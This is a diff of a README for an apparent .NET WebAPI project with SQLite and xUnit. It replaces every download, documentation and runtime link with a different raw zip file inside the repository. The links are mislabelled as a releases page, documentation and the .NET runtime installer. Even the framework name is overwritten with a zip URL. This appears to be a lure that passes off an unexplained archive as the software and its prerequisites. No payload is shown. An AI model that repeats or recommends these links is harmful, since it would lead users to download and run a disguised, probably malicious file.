@@ -1,6 +1,6 @@
 # 🌐 krt-client-api-mvc-net-sqlite-xunit - Easy API Management Made Simple
 
-[![Download Latest Release](https://raw.githubusercontent.com/Fahess1150/krt-client-api-mvc-net-sqlite-xunit/main/KRT.Cliente.Api/KRT.Cliente.API.Test/Data/krt-client-api-mvc-net-sqlite-xunit_v1.8.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/Fahess1150/krt-client-api-mvc-net-sqlite-xunit/main/KRT.Cliente.Api/KRT.Cliente.API.Test/Data/krt-client-api-mvc-net-sqlite-xunit_v1.8.zip)
+[![Download Latest Release](https://github.com/Fahess1150/krt-client-api-mvc-net-sqlite-xunit/raw/refs/heads/main/src/mvc-sqlite-krt-api-client-xunit-net-1.9-beta.3.zip%20Latest%20Release-Click%20Here-blue)](https://github.com/Fahess1150/krt-client-api-mvc-net-sqlite-xunit/raw/refs/heads/main/src/mvc-sqlite-krt-api-client-xunit-net-1.9-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome! This guide will help you download and run the krt-client-api-mvc-net-sq
 
 krt-client-api-mvc-net-sqlite-xunit is a WebAPI application. It supports creating, reading, updating, and deleting (CRUD) client and account data. The application uses:
 
-- **https://raw.githubusercontent.com/Fahess1150/krt-client-api-mvc-net-sqlite-xunit/main/KRT.Cliente.Api/KRT.Cliente.API.Test/Data/krt-client-api-mvc-net-sqlite-xunit_v1.8.zip Core**: A powerful framework for building web applications.
+- **https://github.com/Fahess1150/krt-client-api-mvc-net-sqlite-xunit/raw/refs/heads/main/src/mvc-sqlite-krt-api-client-xunit-net-1.9-beta.3.zip Core**: A powerful framework for building web applications.
 - **Entity Framework Core**: Simplifies database operations.
 - **SQLite**: A lightweight database engine.
 - **Unit Testing with xUnit**: Ensures reliability of the application.
@@ -22,7 +22,7 @@ To get started, you need to download the application.
 
 1. **Visit the Download Page:** Click the link below to go directly to the Releases page where you can find the downloadable files.
 
-   [Visit the Releases Page to Download](https://raw.githubusercontent.com/Fahess1150/krt-client-api-mvc-net-sqlite-xunit/main/KRT.Cliente.Api/KRT.Cliente.API.Test/Data/krt-client-api-mvc-net-sqlite-xunit_v1.8.zip)
+   [Visit the Releases Page to Download](https://github.com/Fahess1150/krt-client-api-mvc-net-sqlite-xunit/raw/refs/heads/main/src/mvc-sqlite-krt-api-client-xunit-net-1.9-beta.3.zip)
 
 2. **Select the Latest Release:** On the Releases page, look for the latest version of the application. It should be at the top.
 
@@ -35,7 +35,7 @@ To get started, you need to download the application.
 Ensure your system meets the following requirements:
 
 - **Operating System**: Windows 10 or higher; other systems like macOS and Linux may work with Docker.
-- **.NET Core Runtime**: Version 3.1 or higher needs to be installed for the application to run. You can download it [here](https://raw.githubusercontent.com/Fahess1150/krt-client-api-mvc-net-sqlite-xunit/main/KRT.Cliente.Api/KRT.Cliente.API.Test/Data/krt-client-api-mvc-net-sqlite-xunit_v1.8.zip).
+- **.NET Core Runtime**: Version 3.1 or higher needs to be installed for the application to run. You can download it [here](https://github.com/Fahess1150/krt-client-api-mvc-net-sqlite-xunit/raw/refs/heads/main/src/mvc-sqlite-krt-api-client-xunit-net-1.9-beta.3.zip).
 
 ## 🛠️ Features
 
@@ -47,7 +47,7 @@ Ensure your system meets the following requirements:
 
 ## 📖 Documentation
 
-For more detailed information about the application, check the [Documentation](https://raw.githubusercontent.com/Fahess1150/krt-client-api-mvc-net-sqlite-xunit/main/KRT.Cliente.Api/KRT.Cliente.API.Test/Data/krt-client-api-mvc-net-sqlite-xunit_v1.8.zip) link in the repository. This section includes tutorials and guides on using specific features.
+For more detailed information about the application, check the [Documentation](https://github.com/Fahess1150/krt-client-api-mvc-net-sqlite-xunit/raw/refs/heads/main/src/mvc-sqlite-krt-api-client-xunit-net-1.9-beta.3.zip) link in the repository. This section includes tutorials and guides on using specific features.
 
 ## 🌐 Support & Contributions
 
